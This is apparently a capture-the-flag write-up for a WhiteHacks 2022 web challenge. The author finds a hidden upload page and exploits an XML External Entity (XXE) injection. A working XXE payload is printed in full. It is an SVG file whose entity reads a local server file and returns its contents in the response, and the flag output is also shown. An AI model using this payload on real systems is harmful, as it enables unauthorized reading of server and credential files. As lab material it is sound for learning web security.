# ransom_console-1

When we enter this website, we see a login page. We don't get much info from developer tools either.

When we check `robots.txt`, we get

    User-agent: *
    Disallow: /upload /dashboard
    
Upon checking `/dashboard`, we see that the page doesn't exist. However, when we check `/upload`, we are redirected to a file upload page. When just uploading a random txt file, an internal server error occurs, and that we are redirected to http://challenges1.whitehacks.xyz:5001/xml-parse. From this we can infer that the website only allows us to upload an xml file. A quick google lead me to infer that this challenge involves a XML External Entity (XXE) Injection attack. Another quick google resulted in me finding [this](https://gupta-bless.medium.com/exploiting-xxe-via-file-upload-f6e62153e85d) medium article which gave me a XXE payload which lets us fetch another file in the website directory. After changing the payload to fetch the file at `/home/r4s0m_4d1m1n/flag.txt`, we get this payload:

    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/r4s0m_4d1m1n/flag.txt" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
    
We upload this xml file and the website returns us this:

    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="128px" height="128px" version="1.1">
      <text font-size="16" x="0" y="16">WH2022{SSH_KeY5_ST0L3n_8y_U5}</text> 
    </svg>
    
Flag:
>WH2022{SSH_KeY5_ST0L3n_8y_U5}
